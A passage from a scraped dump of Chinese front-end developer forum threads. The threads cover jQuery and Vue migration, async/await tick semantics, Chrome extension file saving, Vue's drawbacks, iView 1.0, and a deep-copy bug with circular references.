{\n\tvar f=staticFilesConf.maps[type],\n\t\tsrc=this.getStaticFileHost()+staticFilesConf.path+f.name+'.js?'+f.cache;\n\tif (/msie\\s7/.test(navigator.userAgent.toLowerCase())) this.load(this.getStaticFileHost()+'/js/json2.js');\n\tthis.load(src,function(err){\n\t\tif (err) {\n\t\t\tYL.load(src,function(err){\n\t\t\t\tif (err) throw src+'---- SCRIPT LOAD FAILED !';\n\t\t\t});\n\t\t};\n\t});\n});\n</code></pre>\n<p>为了防止不同页面可能存在的相同节点的操作造成事件多重绑定之类的不可预知问题，采用 new Image().src 的方式来预加载，即只加载不执行，后面直接取缓存；关于缓存的问题，服务器 Nginx 那的缓存我们无法控制就不考虑了，现在采用的是替换式更新，所以用文件内容 hash 替换文件名的方式也暂不考虑了，所以去缓存操作，后端只需给 main.js 加上 query 戳就可以了，那么各个版块的缓存就只需在上面的 maps 里改就行了；结果就是后端可控的 js 就只剩 main.js 了，其他的全在前端控制；</p>\n<p>天有不测风云，印链 3.0 开始，换了个更有行业经验的老马（人不老）做产品经理，对整个产品做了变革式的重构，业务版块更多，业务逻辑更复杂，目前已完成他完美战略蓝图的一半据说，前端代码量已超之前两倍；新版继续沿用了 main.js （事实证明 2.0 的改造是有效的），还是 Jquery 作为基础库，放弃了 Seajs 的模块化方式，新代码开始使用 ES6 的模块化方式，用 Webpack 的多入口模式构建；接下来准备在新的大板块中使用 Vue2 来逐步替换 Jquery ，毕竟将之前的代码全改装为 Vue 版的，一下子不太可能，时间也不允许，可能是我有强迫症吧，不太喜欢一份代码里既有 Jquery 又有 Vue ，话说我开始担心了： ES6 普及后 Jquery 未来的路在哪里？ 3.0 开始由于准备工作不够充分，初期在 IE7891011 这一家子上栽了个大跟头，直到 ErrorInspector.js （留下了，还在改进中<a href=\"http://famanoder.com/bokes/5867eea54aee37201fb4d1cc\" rel=\"nofollow\">http://famanoder.com/bokes/5867eea54aee37201fb4d1cc</a>）出来不久，情况出现了好转，客户端内核终于换成 webkit 了，是的，厉害的队友总能让人快速的有所长进！现在 main.js 里可以加上 ErrorInspector 了：</p>\n<pre><code>ErrorInspector.Config={\n    url:'http://error.famanoder.com/ErrorInspector/common',\n    $:{\n        timeout:60000\n    },\n    IgnoreMsgPattern:/script\\.error/ig,\n    IgnoreBrowserError:true\n}\n</code></pre>\n<p><strong>3 、关于自学的前端</strong></p>\n<p>臭不要脸的说一下，有初学者问我怎么学前端，我只是“敷衍”的说了 6 个字：多看多练多思考；因为我也还处于这条路的探索之中，不敢误导初学者、或者让大神们笑话；最近遇到了瓶颈期，前端没什么进步， Nodejs 学了个半吊子，被 Koa2 吸引却没有太多的尝试，看到社区大家分享的很多重大问题都有些力不从心，没事还担心 Vue 、 React 它们牛逼哄哄的会不会替代 Jquery （看来我依然深爱着 Jquery ）。。。如今， Angular2 携 TypeScript 、 AOT 又王者归来了，今年有的是东西去琢磨了；我不喜欢这么多框架，我只是想探索下它们牛逼的地方；谁说爱上一部没有结局的前端剧本，唯一结局就是无止境的追；谁说不管爱上什么剧本，也要不断追求得一个安稳；（好像歌词哈。。。）</p>\n<p>好吧，我又得思考一个问题了：百花齐放的前端，留给我的余香会是什么呢？</p>\n<p>原文来自：<a href=\"http://famanoder.com/\" rel=\"nofollow\">花满楼</a>（<a href=\"http://famanoder.com/bokes\" rel=\"nofollow\">http://famanoder.com/bokes</a>）</p>\n</div></div>"], "reply": "20", "tittle": "前端瓶颈期，反思一些问题", "comment": ["总体来说就是 js python 化 最后 js 一桶天下\r", "\r", "不过 php 是最好的", "所以到底哪个框架最好？", "用 jQuery 的人重感情。", "6 个字..", "6 个字， 233", "ES6 再普及浏览器上跑的还不是 ES3 你用的 ES6 是无数 polyfill 和 babel 撑起来的\r", "\r", "IE 得 11 死完到 edge 差不多吧 现在 es5 还得 fill 呢", "ng2 亡者归来", "6 个字， 2333", "到底什么时候才能彻底摘掉 IE 这颗前端大毒瘤。。。", "6 个字是啥梗？", " 明明是 7 个字 多看多练多思考", "非常 6+1 啊", " 其实现在情况好很多了，由于 IE8 及以下 object.defineproperty 的硬伤，还有 sha1 认证过期的安全隐患， IE8 即将倒台，而 IE9+通过 babel 基本上没啥大问题了，所以 ES6 还是转码到了 ES5", " 新的 ECMAScript 确实借鉴了很多后端语言优良的特性；\r", "反正我不会拍黄片", " 天猫不要 IE8 了，流行框架基本上都是基于 ES6 ，值得有足够的信心拥抱新标准", " 为什么牛逼的人总是什么都会", " 实际上除了 angularjs vue 、 react 的 es5 语法都超优美", " 顺便，要不要拥抱新标准，从后端的角度来看，是有多少轮子用，这就是 php5.4 py2.7 java1.6 生生不息的原因，语言不优美 util 优美就可以，人家不提供轮子直接提供造好的跑车\r", "作为小厂，轮子有多好用永远是第一要素，语言之美？我不认为 es6 有啥吸引我的特性，你说那个叫 class ？下辈子吧。\r", "那种改变生产力的没有，你说 async ？解构？还是 array 和 object 那些附加函数，或者给 object 里放个[xx]??这跟 css3 不同， css3 有的没有那是真痛苦\r", "只有前端最牛逼， draft 的特性都敢上生产，换任何一个后端语言找不到， es3 就那个尿性，换了 es6 还那个尿性， c 、 java 、 c#好好抄一个不行么", " 这话从何而来 ...", " 念旧，能用就好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>又或者 因浏览器差异而有所差别，\n那么具体要怎么看到他们的间隔时间具体是多少</p>\n</div></div>"], "reply": "5", "tittle": "js 垃圾回收机制 时间间隔/周期 具体是多长时间", "comment": ["这个因 js 引擎不同而策略不一样，很难具体回答什么时候会执行。详细的你可以看下 v8 引擎原理做下参考，或者朴灵的那本 nodejs 里也有相关的介绍。 chrome dev tool 里面可以看内存堆栈情况。", "你要干啥？做游戏的话得考虑用内存池自己管理了。", " 是的，考虑用数组缓存了。 但是现在有点不明白垃圾回收这里具体细节，想了解一下下", " \r", "\r", "这有篇文章，你参考下。", "具体垃圾回收时间是不确定的，看你内存使用情况，浏览器还是基本不用考虑垃圾回收的，一般 nodeJs 做服务器高并发的时候会出现内存泄露是要考虑的"]},
{"content": "", "reply": "49", "tittle": "关于 async function 的设计哲学：如何评价 await 一个 resolved 的 promise 会使上下文拆成两个 tick ？", "comment": ["要求进一步详细信息: 能不能添加一点代码示例来表达情况？", "let s = 0;\r", "(async () => {\r", "  await Promise.resolve();\r", "  ++s; //2\r", "})();\r", "++s; //1", "我希望是这样：\r", "let s = 0; \r", "(async () => { \r", "await Promise.resolve(); \r", "++s; //1\r", "})(); \r", "++s; //2", "... 楼主, seriously?", "?", " ?", "你需要一个全局 async", "什么哲学，本来就该这样。。", "你的期望就不该这么写。。", "竟然想顺序执行，为啥还要用 await/async 。。。没明白你想表达啥。", "async 的目的就是拆成两个 tick ，你的期望叫做 sync", "你的期望是错的……", " @", " 我只是举个栗子——你有没有想过既然已经 resolved 了，干嘛还要拆 tick ，过多的 tick 影响性能", "在某些场合我会对状态转移函数作缓冲，如果一个 tick 内又转移回来了便不触发状态改变的事件，上面的设计影响了我的缓存命中", "异步是会传染的。。如果你希望全部按同步逻辑来写，那你应该用 async 包住整个逻辑", "\r", " \r", "你期望的结果，跟你认为实际会发生的结果，在我认为的实际里面，实际上都有可能发生。\r", "当然，一个异步结果很大可能总是会比下一个同步结果来得慢，但也并不是完全不可能得到相反的快慢结果。\r", "\r", "所以你实际情景中遇到的问题是什么，请不要用自己的抽象来说明了，请直接一点吧。", " 什么叫很大可能？ js 是单线程的，各语句的执行先后是确定的", " 我的缓存机制是这样的，每过一个 tick 就回收一些缓存，所以两次操作间隔的 tick 越少能命中的缓存就越多", "我非常不理解 await 对 tick 的极大浪费", " 你的缓存回收是纯内存操作？这个缓存回收是在异步操作里面完成？为什么要这样做？", "请问以下例子与 po 主所示代码中的异同\r", "let s=0;\r", "(()=>{\r", "setTimeout(()=>s++,0);\r", "\r", "})()\r", "++s;", "a();p.then(b);c();  如果 p 已经被 resovled    那楼主的理解是不是执行顺序为 a b c ？  这个问题本质上和 await 是一致的", "楼主想要的是下面这样的效果吗？其实调用 async 函数本质就是返回一个 promise\r", "async function foo() {\r", "    let s = 0; \r", "    await (async () => { \r", "        await Promise.resolve(); \r", "        ++s; //2 \r", "    })(); \r", "    ++s; //1\r", "}\r", "\r", "foo();", " 你根本没理解 node 的异步机制", "await 怎么对 tick 有什么浪费了……\r", "本质上这里涉及到的还是 Promise 的概念， Promise 的 then(f, r) 保证了 f 一定不是立即执行的（看起来像是异步），而是被立即入队。要是 then 一会儿是同步的一会儿是异步的，这对整个系统来说都是灾难好吗？\r", "你都知道 async 关键字的意义，那么如果一定要实现你想实现的，肯定要把你的整个状态机都包含在 async function 内部啊……你想要用 async 的语法糖来让你的代码更方便一些，一会儿又在语法糖外面抱怨语法糖。你所谓的性能影响是因为你用了错误的方式造成了一些“意料之外”的结果，光是 then 将 f 入队本身没有什么严重的开销。", " 我觉得 async function 应该节省 tick ，另实现一个时而异步时而同步的 then2 。健壮的程序可以应对时而同步时而异步的回调。", " tick 本身确实开销不大，但节省 tick 可以带来的好处很多，除了我说的缓存机制，还有很多卡 tick 的事可以做", "jQuery 的 Deferred 最初就是你的这个模式，如果已经 resolved 则是同步的，否则会变成异步\r", "但是这显然是不行的，从语言来说最重要的是一致性，即一个 Promise 你不应该需要知晓其当前状态（你看 Promise 本身也没有一个字段让你读状态），其当前状态应该不会影响你的任何逻辑，所以无论是否 resolved 其都必须是异步的", " 还是那句话啊，你大概在理解上有一点偏离了……\r", "\r", "Promise 的设计本来就是需要保证异步的，不然这对使用者来说有极大的不稳定性需要考虑过于复杂的情形，甚至在有些场景下这将对整个代码结构都带来灾难性的破坏。 Promise then 本来就不是阻塞的不是同步代码，本来就是你所谓的 \"tick\" 模式。\r", "\r", "then 把一个任务加入了队列，你的外部世界的语句本来就没处在 Promise 的范畴内，自然和这个任务也没有关系。\r", "\r", "我们来看看你想要的结果，你想要的是：\r", "\r", "- 对一个 Promise 调用 then(f)，如果这个 Promise 已经 resolve 了，那么 f 是立即执行的而不是被加入队列等当前的任务完成再执行。\r", "\r", "如开头所说不这样的原因是，这让 Promise 变得不确定，实际生产中这会带来很大的问题（ V2EX 上就会有一大堆人开始批判这个坑），没人会想用 Promise 。而且说实话，一个函数一会儿同步一会儿异步，这很怪异，我没见过。\r", "\r", "可是你偏想要这么做，要提供一个 then2 ，满足这样的效果可以么？可以，当然可以啊（扩展一个 Promise 类，保存 Promise 的状态，调用 then 的时候检查一下然后做处理。对于 await ，虽然可能需要自己写处理器 polyfill 一下，在真正调用 await 之前检查一下 Promise 的状态），可是你真的需要这么做么？这就是大家关注的问题所在，我们可能认为你本来并不需要这样做（比如楼上有人提到你可能需要一个全局的 async 等等），所以认为你的理解是有偏差的。\r", "\r", "你所谓的各种卡 \"tick\" 的好处，不是 then(f) 可以一会儿同步一会儿异步的理由。", "前面 @", " 说的对，想保证执行顺序就是\r", "\r", "let s = 0; \r", "await (async () => { \r", "await Promise.resolve(); \r", "++s; //1 \r", "})(); \r", "++s; //2\r", "\r", "不过这跟 tick 没有关系，肯定是多个 tick 才能完成。\r", "Premature optimization is the root of all evil -- DonaldKnuth", "明明是同步逻辑非要写成异步有什么办法。 await 了不交控制流出去难道阻塞着过年？", " 我和你对一致性的理解有分歧，我认为健壮的程序无需 then 旳异步保证、同异步无本质区别。更显然地如果 then 实现成我说的，改成现在的会很方便：\r", "Promise.all([p, new Promise(r => setTimeout(r, 0))]).then\r", "即可，而从现在的实现改成我说的，就只能放弃 async function 改用 generator function 了", " 然而你想要的永远不会和任何语言的设计原则相符合，这就是现实", "最简单的例子，把你的代码改成一个比较现实的代码：\r", "\r", "(async () => { \r", "let user = await fetchCurrentUserInfo();\r", "console.log(1);\r", "})(); \r", "console.log(2);\r", "\r", "请问你认为这个代码应该是 1 - 2 还是 2 - 1 还是任意都可以？", " \r", "一会异步一会同步的你没见过不代表没有， C#的 async await 就是这样的。", "C#之类的这么做是从性能的角度考虑已经完成的同步执行性能会更好，比如从 socket 读一段数据，这个操作可能可以立即完成也可能无法立即完成。对于可以立即完成的完全可以同步执行，对于无法立即完成的才异步。\r", "至于 node 为什么选择全异步就了解了。", " 打错，最后一句少打了个不字。", " 兄弟你要结合上下文不是这么断章取义的，我说的是作为 Promise 的一个 API ， then 的执行一会儿是同步一会儿是异步。\r", "\r", "给你一个 API readFile 然后告诉你这个 API 有可能是同步的有可能是异步的？\r", "\r", "写 Promise 链的时候就不会关心你的业务逻辑具体是怎么执行的，你从缓存里直接读也好你发请求异步读也好，只是在我 method chain 中的一环而已我还要去关心你是同步异步的具体做了什么事？而且这里还并没有显示能够看到是同步还是异步的方法，只是做了一个函数调用而已。\r", "\r", "Promise 本来是用来干嘛的，要解决什么问题，所以他这么设计了，把不稳定性和混乱引进来强行可以卡 tick 做很多的事情，关键是这些事情本来不是这么去做的。", " 而且由于我不太清楚 C# 里面的 async/await 的实现，然而我简单地搜索了一下，包括 ", " 这篇文章，这样如果抛开 nodejs 和 C# 单 /多线程的区别的话，看起来并没有什么不同。文章中有提到 `await 关键处的代码片段是在线程池线程上执行` 并不是 GUI 线程。再者，搜了一下知呼，里面也提到 await 开始的那一刻 async 函数就返回了，其实都是编译器的语法糖而已。是我理解有问题吗……感觉不是很懂你的意思了……", " \r", "不\r", "task 或者 future/promise 抽象并不一定要异步，可以是延后执行，现在在上班，晚上再具体回复你。", " 这两条语句间没有顺承关系，我觉得无所谓哪条先执行", "可能编译器可以直接处理这种情况将异步代码转为同步代码执行，不过会带来增加编译时间等开销吧。", "那么不想写异步代码楼主还是写 go 吧。", "async 只是语法糖而已，本质还是 Promise ，既然是 Promise 那当然是异步的，因为 Promise 就是这么设计的。", "我想你需要这个：\r", "\r", " \r", "``` cs\r", "var task = Task.FromResult<int>(1 + 2);\r", "new Action(async () => {\r", "    await task;\r", "    Console.WriteLine(\"1\");\r", "})();\r", "Console.WriteLine(\"2\");\r", "// Output:\r", "// 1\r", "// 2\r", "```\r", "``` cs\r", "var task = Task.Delay(1); // delay 1ms\r", "new Action(async () => {\r", "    await task;\r", "    Console.WriteLine(\"1\");\r", "})();\r", "Console.WriteLine(\"2\");\r", "// Output:\r", "// 2\r", "// 1\r", "```\r", "C#的 async 、 await 是这样的，立即可以完成（代码 1 ）的，可以同步执行先输出 1 再输出 2 ，需要 1ms 才能完成的（代码 2 ），才必须异步先输出 2 再输出 1 。\r", "C#应该是最早使用 async 、 await 语法糖的语言，之后才被各语言争相效仿（如果有更早的请指正），这种允许同步执行的 await 也被证明设计上没有错误，所以 ES7 如果是强制异步的话，就是设计哲学的问题了。", " \r", "而关于 future/promise 用于延后执行，可以看下这个。\r", "\r", "std::launch::deferred\tenable lazy evaluation", "因为 Promise 的 resolved/rejected callback 是异步执行的。就将。"]},
{"content": ["<div class=\"topic_content\">一般我们保存一个网页是 ctrl+s 。 如果用插件来实现保存一批网址或者打开的标签页，如何实现呢？</div>"], "reply": "10", "tittle": "关于 chrome 插件开发，如何实现将网址或者标签页保存到本地？", "comment": ["chrome 应用才有权限保存到本地(chrome 本身以外)吧", "= =保存在本地指的是？", "参考代码,可以这样实现,点击直接下载\r", "```\r", "document.getElementById('exportTemplate').onclick = function()\r", "    {\r", "        chrome.storage.local.get(['template'],function(e)\r", "        {\r", "            var str = JSON.stringify(e.template);\r", "            var hiddenElement = document.createElement('a');\r", "\r", "            hiddenElement.href = 'data:attachment/text,' + encodeURI(str);\r", "            hiddenElement.target = '_blank';\r", "            hiddenElement.download = '我的模板.json';\r", "            hiddenElement.click();\r", "        });\r", "    };\r", "```", "额,回复不支持 markdown 啊", " 扩展也有", " 就是 ctrl+s 的功能啦。", " 感谢感谢！我去试试。", "新建一个文件夹，然后右键一个 tab 选择保存所有 tab...", " chrome 有这个功能么？", " 说的就是“为所有书签页添加标签”的功能"]},
{"content": ["<div class=\"topic_content\">Vue.js 的优点我们已经听了很多了，我自己实际用起来也确实很好用。那么 Vue.js 有哪些缺点呢？最好基于 Vue 2 来讲</div>"], "reply": "42", "tittle": "Vue.js 有什么缺点？", "comment": ["同问", "社区，生态，大公司支持....\r", "\r", "在代码层面我觉得该有的解决方案都有了。", "要学习 webpack 等包管理工具，要学习 ES6 ，配合这些起来的话，入门比较难。", "感觉 template 不好 debug ， react 的话就是 js", " 我觉得 vue-cli 把 webpack 隔离的很好了，基本不用自己操心配置了", "中国人做的，而中国人又喜欢内斗，所以会有很多人喷", "目前感觉生态不太成熟，比如 编辑器里的语法提示 不太完善， 而这个又对效率很重要", "IDE 或编辑器的语法提示插件数量和质量与 React 不能比。\r", "生态没有 React 全。\r", "不过做小项目特别快。", "一些控件设置的值无法绑定相应的 model ，比如 typehead", " Vue 应该有 jsx 的支持", "主要还是社区吧，这点是无法与 react 和 angular 相比的。另外 stackoverflow 相关的问题相对也少的可怜。", "感觉除了 .vue 的感知问题没有明显的毛病", "编辑器支持还比较弱\r", "\r", "网上资料相对少一点\r", "\r", "其他都还好，开发起来很舒服", " 用 jsx 写 vue 那我为何不去用 react 呢？", "希望资料再完善一点。再出点官方高阶教程，最佳实践啥的。免去探索时间。", "编辑器支持太差", "逼格不高", "和某些模版引擎存在冲突", "对初学者不友好（逃", "不要作，要感恩， vue2.0 我打满分", "fragments instance 这么难忍的问题没人说？ 当然了， React 也有。", "也稍微来评价一下 Vue 的缺点吧。如果说 Vue1 和 React 比还是有一定的差距的，到了 Vue2 基本上可以说是没有什么差距了(在我看来)。\r", "\r", "1 、 Vue 给我感觉最大的缺点就是当初为了追赶上现有框架， Vue 给予了整个生态环境的官方配套技术方案 Vuex 、 VueRouter 。这是一件好事，不过也是一种双刃剑。如果让大家去找能够替代 Vuex 、 VueRouter 的其他框架，要求 star 过千，文档齐全，更新频率较快，有教程的。。你会发现一个都没有。现在市面上大家广为人知关于 Vue 相关的都是 UI 组件。非 UI 组件类型的不多。而在 2014-2015 年，我用 React 的时候可以说是百花齐放，一堆有的没的 flux 框架出现，现在处于垄断地位的 Redux ，也是优胜劣汰之后的结果。 React 方面能够有更多的第二选择，而 Vue 目前是缺乏“第二选择”的。\r", "\r", "2 、 React 在 Facebook 的大力推广下，学习 React 能够带来比 Vue 更多的技术、资源上面的红利。最典型的莫过于 ReactNative ，虽然说 Vue 已经开始弄 Weex 了。可是 Weex 能否追赶上 ReactNative 还是一个未知数。同样的，在技术岗位上面，接受 React 的公司目前来说也是比 Vue 多的。\r", "\r", "3 、 Vue 不缺入门教程，可是很缺乏高阶教程与文档。同样的还有书籍。\r", "\r", "4 、用 Vue 去实现同一套需求，可以有 N 种写法。这是一件好事，不过很容易造成代码风格不统一所带来的维护困难。比如说对于多逻辑分支的情况下，用 jsx 去实现会远远比用 template 的方式优雅和清晰，可是却会让你的代码看上去风格差异异常明显。而在一些小的点上，你也会去过多的去考虑是用 computed 好，还是 method 好。诸如此类。\r", "\r", "5 、正如楼上的说，如果你需要去 debug template 渲染模板的话， 你会发现非常麻烦。\r", "\r", "其他想到再补充。最后，如果你让我在 React 和 Vue 之间选择的话，我还是会选择 Vue 。哇卡卡卡", "1. 生态和 react 比差太多，想按需求找个库（比如 drag ， heatmap ），基本都是 react 的 ， ng  也有可能有， vue 有的可能性很小。\r", "2. ide 支持不足， webstorm 写 react 炒鸡爽， vue 只能是写。 reformat 提示什么的都木有", "以前写 react ，现在自己写 respo ，遇到奇怪的行为可以打断点，其实也就是高阶函数嘛，变量都在 scope 里，某些东西绑到了 this 也可以从顺着访问，有时候懒得看文档也还是能明白自己错在哪。写 vue 的时候我得全程开着文档啊，整个自己实现了一遍 DSL ，偶尔写错自己写就晕了，现在基本都反应过来我一定是哪个地方没有按照文档写，然后感觉跟文档上对照看哪错了。类型检查，运行时审查，以前用惯的东西不能直接玩了。", " 强烈赞同~", "template 的问题。\r", "举个例子的话，比如 jade/pug 作为 template 的时候，其中绑定的语法依然只能按照 Vue 的风格去写 mustache ，不能按照 jade/pug 的风格。", ".vue 文件感觉不太美", "  严重同意\r", "debug 烂，内部实现黑科技，再怎么好学我也不会用了。", "最大的缺点是 star 没 react 少,造成一部分人对 vue 产生偏见", " 打错了,没 react 多", " +1", "按照现在的形式，最好学 react 或者 react ， vue 两个都学，你现在去任何一家互联网公司 react 都是你避不开的话题，没有多少公司只用 vue 的，要么就是 react 和 vue 都有，要么就是 react", "编辑器的支持吧_(:з」∠)_ 没提示感觉写的要死了", " 嗯。开发体验低。", "补充 2 条：\r", "1. 我非常反感类 ng 指令\r", "2. vuex 维护可变数据容易出现非 reactive data", "Vue 编辑代码提示可以看看这个 ", "有一个严重的缺点，个人崇拜主义太强，坚决不能说 Vue 有问题，有缺陷，否则尤大会亲自过来反驳，并招来一批粉丝对骂。", "ls 加一，国内说 vue 不好，跟说 tfboys 不好一样，一群人上来微博咬你", "生态和 angular 、 react 比起来差了些，估计 2 年内都比较难追上", " 看一眼 JavaScript 的 trending 吧,vue 每天的 star 都比 react 多几十,照这趋势,一年 star 就超过 react", "我就想知道 vue 如何像 react 一样网组建里批量塞 props?", " 感觉还是国人多的原因。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/egoist/vegito\" rel=\"nofollow\">https://github.com/egoist/vegito</a></p>\n<pre><code>const vegito = require('vegito')\n\nvegito('hello {{ name }}', {name: 'world'})\n//=&gt; hello world\n\nvegito(`hello {{ name.toUpperCase().split('').join('-') }}`, {name: 'world'})\n//=&gt; hello W-O-R-L-D\n\nvegito(`hello {{ reverse('world') }}`, {\n  reverse: str =&gt; str.split('').reverse().join('')\n})\n//=&gt; hello dlrow\n</code></pre>\n</div></div>"], "reply": "4", "tittle": "vegito: 仅 463 bytes 大的模板引擎", "comment": ["楼主真的高产 ... 很厉害", "很好很腻害", "为什么第一个例子里面传入的是字符串，第二三个例子里传的是模板字符串？", " 因为用了单引号，而我不想在外面用双引号。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>感觉学完之后，学 ES 2017 吧</p>\n<p><a href=\"https://frankfang.github.io/es-6-tutorials/\" rel=\"nofollow\">https://frankfang.github.io/es-6-tutorials/</a></p>\n<p><a href=\"https://github.com/FrankFang/es-6-tutorials\" rel=\"nofollow\">GitHub</a></p>\n</div></div>"], "reply": "3", "tittle": "ES 6 新增特性列表", "comment": ["ES6 除了在 for 循环中使用 let ，其他地方使用 const ，也没有什么问题。", " let 一般是作为 temp 用的，用完就扔不污染。用 const 定义不需要改变的东西，剩下的用 var ，这几个开销不一样，最好酌情使用", " #1 谁给你下的这个错误理论"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>时隔半年多， iView 终于迎来了它的第一个正式版本 1.0.0 ，到目前版本，已经有 43 个常用 UI 组件，从功能和设计上，是最接近 Ant.Design 的 Vue.js 实现。</p>\n</blockquote>\n<h2>关于 iView 1.0</h2>\n<p>** GitHub 地址：<a href=\"https://github.com/iview/iview\" rel=\"nofollow\">https://github.com/iview/iview</a> **</p>\n<p>iView 已经从最初的高质量 UI 组件库，逐步过渡到了从工程构建、主题定制、多语言、设计规范的一整套的前端解决方案。主要服务于中后台业务，目的就是让网站快速成型上线。</p>\n<h2>1.0 都有哪些新特性</h2>\n<p>先看一下目前支持的组件情况：</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/26d8c6705e9b02ddf3c4.png\">\n常用的组件包括了： Grid 栅格、提醒类（ Message 、 Notice ）、模态 Modal 、表格 Table 、级联选择、输入框、表单验证、单选、多选、下拉选择、滑块、上传、日期时间选择、分页、导航菜单等。</p>\n<p>除了基本组件外， 1.0 还加了很多新东西:</p>\n<ul>\n<li>常用布局 <a href=\"https://www.iviewui.com/components/layout\" rel=\"nofollow\">Layout</a></li>\n<li>定制主题 <a href=\"https://www.iviewui.com/docs/guide/theme\" rel=\"nofollow\">查看</a>，及主题构建工具 <a href=\"https://github.com/iview/iview-theme\" rel=\"nofollow\">https://github.com/iview/iview-theme</a></li>\n<li>支持 vue-cli 的模板 <a href=\"https://github.com/iview/webpack\" rel=\"nofollow\">https://github.com/iview/webpack</a></li>\n<li>支持 Mac 和 Windows 的可视化脚手架软件 <a href=\"https://github.com/iview/iview-cli\" rel=\"nofollow\">iview-cli</a></li>\n</ul>\n<p>值得一提的是，可视化脚手架 iview-cli 。相信大家都用过 vue-cli ，用命令行来创建 Vue 应用，虽然已经很方便了，但配置起来不够全面，而且对于很多后端人员，安装成本也比较高。看一下 iview-cli 的界面吧：</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/afb73fa653ff41e38617.png\"></p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/22786a376df0b66e3b3a.png\"></p>\n<p>关于更多的细节，会在下一篇文章《 Electron 从 0 到 1 ：可视化脚手架 iview-cli 开发实践》中详细介绍，敬请期待！</p>\n<h2>2.0 计划</h2>\n<p>基于 Vue.js 2.x 的 iView 2.x 也会很快开始开发，初步预计开发时间为 2~3 个月。\niView 还有很多需要改进和提高的地方，希望对其感兴趣的小伙伴可以加入到开源项目里来，贡献您的代码，一起把 iView 做到极致！</p>\n</div></div>"], "reply": "19", "tittle": "iView 发布 1.0 正式版， 43 个 UI 组件助力中后台业务开发", "comment": ["需要支持 vue2 , 很久之前就关注了 , 可惜一直没 vue2.x 的版本", "LZ 的组件图是用什么画的啊？看着不错", "支持，看了你的代码，学到不少。", " 1.0 是个里程碑， 2.0 已经开工了，很快就会支持啦", " MindNode", "点个赞！", "支持，点赞", "赞，同期待 《 Electron 从 0 到 1 ：可视化脚手架 iview-cli 开发实践》", "赞!\r", "期待支持 vue2", "非常棒!", "Holyhigh ！", "Nice!", "好赞啊。", "关注很久了，也是没看到 vue 2.0 的升级", "2.0 还没开分支吧", "支持，目前用的 ele 的 (element)[http://element.eleme.io/#/zh-CN]", "点赞！已添加到创造狮导航-开发者框架", "期待 2.0 ！！ 赞！", "赞一个！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在网上搜了下 web 移动端裁剪相关的内容，大部分是基于 jquery 写的。自己又不想用 jquery ，于是这段时间闲下来的了没事做就自己写了个无任何依赖的，主要用到了 canvas ，压缩后大小为 16kb 吧，无任何依赖。</p>\n<p>地址： <a href=\"https://github.com/ffx0s/xcrop\" rel=\"nofollow\">https://github.com/ffx0s/xcrop</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "撸了个 web 移动端原生裁剪插件（仿照微信的裁剪功能）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对象 a 、 b 存在循环引用，现在要编写一个 copy 函数，能够正常拷贝 a</p>\n<pre><code>var a = {}\nvar b = {}\na['b'] = b\nb['a'] = a\n\nconsole.log(copy(a))\n</code></pre>\n<p>以下代码能够正常运行</p>\n<pre><code>var store = [] // store 写在 copy 函数外\n\nfunction copy(data) {\n  var isType = function(v, type) {\n    return Object.prototype.toString.call(v).toLowerCase() === '[object ' + type + ']'\n  }\n\n  var checkInStore = function(checkV) {\n    for (var i = 0, len = store.length; i &lt; len; i++) {\n      if (store[i] === checkV) {\n        return true\n      }\n    }\n    return false\n  }\n\n  var _copy = function(_data) {\n    if (checkInStore(_data)) {\n      return _data\n    } else {\n      store.push(_data)\n      var ret = isType(_data, 'array') ? [] : {}\n      for (var k in _data) {\n        var v = _data[k]\n        if (typeof v === 'object') {\n          ret[k] = copy(v)\n        } else {\n          ret[k] = v\n        }\n      }\n      return ret\n    }\n  }\n\n  return _copy(data)\n}\n</code></pre>\n<p>以下代码会抛错</p>\n<pre><code>function copy(data) {\n  var isType = function(v, type) {\n    return Object.prototype.toString.call(v).toLowerCase() === '[object ' + type + ']'\n  }\n\n  var store = [] // store 写在函数里\n  var checkInStore = function(checkV) {\n    for (var i = 0, len = store.length; i &lt; len; i++) {\n      if (store[i] === checkV) {\n        return true\n      }\n    }\n    return false\n  }\n\n  var _copy = function(_data) {\n    if (checkInStore(_data)) {\n      return _data\n    } else {\n      store.push(_data)\n      var ret = isType(_data, 'array') ? [] : {}\n      for (var k in _data) {\n        var v = _data[k]\n        if (typeof v === 'object') {\n          ret[k] = copy(v)\n        } else {\n          ret[k] = v\n        }\n      }\n      return ret\n    }\n  }\n\n  return _copy(data)\n}\n</code></pre>\n<p>将 store 写在 copy 函数外、函数内会有不同的结果。这是为什么啊？半天想不出来，求大神指教，感觉是个作用域问题</p>\n</div></div>"], "reply": "4", "tittle": "深度拷贝循环引用的问题", "comment": ["store 在外面, 位于全局作用域, 无论递归调用多少次 copy, 最终都会顺着原型链找到全局域上的 store.\r", "store 写在里面, 在递归调用 copy 的时候, 每个调用栈内部都有一个单独的 store 状态, 所以, 你确定每次的 store 的状态都是正确的?", "递归循环调用？\r", "第二个函数每次 store 都被初始化为[]，就没有临界值结束循环了", "其实第二段代码只要把 `ret[k] = copy(v)` 改成 `ret[k] = _copy(v)` 就会形成一个闭包，始终保存住 store,isType, checkInStore", " 打断点的时候我也发现 store 每次都初始化过了。\r", " 惊醒梦中人，手误，我也是想递归时调用 _copy 函数，误写\r", "\r", "谢谢"]},
